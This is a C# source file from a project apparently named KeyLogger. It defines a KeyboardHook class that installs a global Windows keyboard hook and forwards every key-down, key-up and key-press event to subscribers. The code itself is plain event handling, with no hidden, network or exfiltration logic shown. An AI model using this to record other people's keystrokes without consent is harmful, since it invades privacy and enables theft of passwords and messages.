using System;
using System.Windows.Forms;
using KeyLogger.Messages;
using KeyLogger.Messages.Events;
using MouseKeyboardActivityMonitor;
using MouseKeyboardActivityMonitor.WinApi;

namespace KeyLogger.Catcher.Hooks
{
    public class KeyboardHook : IInputHook
    {
        private readonly KeyboardHookListener _mKeyboardHookManager;
        private bool _disposed;

        public KeyboardHook()
        {
            _mKeyboardHookManager = new KeyboardHookListener(new GlobalHooker()) {Enabled = true};
        }

        public event EventHandler<HookEventArgs> InputEvent = null;

        public void OnInput(InputMessage inputmessage)
        {
            if (InputEvent != null)
                InputEvent(this, new HookEventArgs {Message = inputmessage});
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        #region Set Event Handlers

        public void SetKeyDown(bool status)
        {
            if (status)
            {
                _mKeyboardHookManager.KeyDown += HookManager_KeyDown;
            }
            else
            {
                _mKeyboardHookManager.KeyDown -= HookManager_KeyDown;
            }
        }


        public void SetKeyUp(bool status)
        {
            if (status)
            {
                _mKeyboardHookManager.KeyUp += HookManager_KeyUp;
            }
            else
            {
                _mKeyboardHookManager.KeyUp -= HookManager_KeyUp;
            }
        }

        public void SetKeyPress(bool status)
        {
            if (status)
            {
                _mKeyboardHookManager.KeyPress += HookManager_KeyPress;
            }
            else
            {
                _mKeyboardHookManager.KeyPress -= HookManager_KeyPress;
            }
        }

        #endregion

        #region Event Handler Functions

        private void HookManager_KeyDown(object sender, KeyEventArgs e)
        {
            var keyboardinputmessage = new KeyboardInputMessage
            {
                KeyboardEvent = KeyboardEvent.KeyDown,
                Key = e.KeyCode
            };

            OnInput(keyboardinputmessage);
            //Log(string.Format("KeyDown \t\t {0}\n", e.KeyCode));
        }

        private void HookManager_KeyUp(object sender, KeyEventArgs e)
        {
            var keyboardinputmessage = new KeyboardInputMessage
            {
                KeyboardEvent = KeyboardEvent.KeyUp,
                Key = e.KeyCode
            };

            OnInput(keyboardinputmessage);
            //Log(string.Format("KeyUp  \t\t {0}\n", e.KeyCode));
        }

        private void HookManager_KeyPress(object sender, KeyPressEventArgs e)
        {
            var keyboardinputmessage = new KeyboardInputMessage
            {
                KeyboardEvent = KeyboardEvent.KeyPress,
                KeyChar = e.KeyChar
            };

            OnInput(keyboardinputmessage);
            //Log(string.Format("KeyPress \t\t {0}\n", e.KeyChar));
        }

        #endregion

        public void Enable()
        {
            _mKeyboardHookManager.Enabled = true;
        }

        public void Disable()
        {
            _mKeyboardHookManager.Enabled = false;
        }

        protected virtual void Dispose(bool disposing)
        {
            if (_disposed)
                return;

            if (disposing)
            {
                _mKeyboardHookManager.Enabled = false;
                InputEvent = null;
                //m_KeyboardHookManager.Dispose();
            }


            // Free any unmanaged objects here. 
            //
            _disposed = true;
        }
    }
}